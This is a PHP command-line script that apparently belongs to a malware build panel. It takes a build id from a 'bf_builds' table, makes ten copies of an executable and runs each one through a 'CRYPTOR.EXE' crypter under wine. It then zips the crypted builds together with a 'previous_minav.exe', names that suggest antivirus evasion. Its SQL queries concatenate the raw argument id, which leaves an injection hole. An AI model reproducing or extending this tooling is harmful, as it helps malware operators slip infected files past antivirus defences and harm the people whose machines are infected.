#!/usr/bin/env php
<?php

set_time_limit(0);
error_reporting(-1);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '256M');

function real_path($p){
    $r =  str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
    if(empty($r)){
	mkdir(str_replace('//', '/', str_replace('\\', '/', $p)));
	$r =  str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
    }
    return $r;
}

$dir = array();
$dir['script'] = pathinfo(__FILE__, PATHINFO_DIRNAME);
$dir['site'] = real_path($dir['script'] . '/../../');
$dir['orig'] = $dir['site'] . 'cache/originals/';
$dir['cfg'] = $dir['site'] . 'cfg/';

if(empty($_SERVER['argv'][1])) exit;
$id = $_SERVER['argv'][1];

$pid_file = 'cache/pids/crypt_'.$id.'.pid';
file_put_contents($dir['site'] . $pid_file, getmypid());
chmod($pid_file, 0777);

$max_file = 10;

include_once($dir['site'] . 'includes/functions.get_config.php');
$cfg_db = get_config();

require_once($dir['site'] . 'classes/mysqli.class.php');
$mysqli = new mysqli_db();
$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0){
	error_log('DB_ERROR: ' . print_r($mysqli->errors, true),4);
	exit;
}

$row = $mysqli->query('SELECT * FROM bf_builds WHERE (id = \''.$id.'\') LIMIT 1');
if(!is_object($row) || $row->id != $id) exit;

$mysqli->query('update bf_builds set status = \'85\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');

$dir['cryptor'] = $dir['site'] . 'cache/cryptor/' . $row->id . '/';
if(!file_exists($dir['cryptor']) && !mkdir($dir['cryptor'])) exit;

if(file_exists($dir['cryptor'] . $row->md5 . '.zip')) unlink($dir['cryptor'] . $row->md5 . '.zip');

if(empty($row->file_crypt)){
    unset($row->file_crypt);
    $mysqli->query('update bf_builds set file_crypt = \'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
}else{
    copy($dir['cfg'] . $row->file_crypt, $dir['cryptor'] . 'previous_minav.exe');
    chmod($dir['cryptor'] . 'previous_minav.exe', 0777);
}

$to_sh = '';
for($i = 1; $i <= $max_file; $i++){
    copy($dir['orig'] . $row->file_orig, $dir['cryptor'] . $i . '.exe');
    chmod( $dir['cryptor'] . $i . '.exe', 0777);
    $to_sh .= '/usr/bin/wine ' . $dir['site'] . 'cache/cryptor/CRYPTOR.EXE ' . $row->id . '/' . $i . '.exe' . "\n";
}

$mysqli->query('update bf_builds set status = \'1\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');

$fcs = '/tmp/cryptor'.$row->id.'.sh';
file_put_contents($fcs, '#!/bin/sh' . "\n");
file_put_contents($fcs, 'cd ' . $dir['site'] . 'cache/cryptor/' . "\n", FILE_APPEND);
file_put_contents($fcs, $to_sh, FILE_APPEND);
chmod($fcs, 0777);
@system($fcs);
unlink($fcs);

$mysqli->query('update bf_builds set status = \'2\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');

$zip_name = $dir['cryptor'] . $row->md5 . '.zip';
if(file_exists($zip_name)) unlink($zip_name);
$zip = new ZipArchive;
$res = $zip->open($zip_name, ZIPARCHIVE::OVERWRITE);
if($res === TRUE){
    for($i = 1; $i <= $max_file; $i++){
	$zip->addFile($dir['cryptor'] . $i . '.exe', $i . '.exe');
    }
}

if(!empty($row->file_crypt)) $zip->addFile($dir['cryptor'] . 'previous_minav.exe', 'previous_minav.exe');
$zip->close();
chmod($dir['cryptor'] . $row->md5 . '.zip', 0777);
$mysqli->query('update bf_builds set status = \'5\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');

if(file_exists($pid_file)) unlink($pid_file);

?>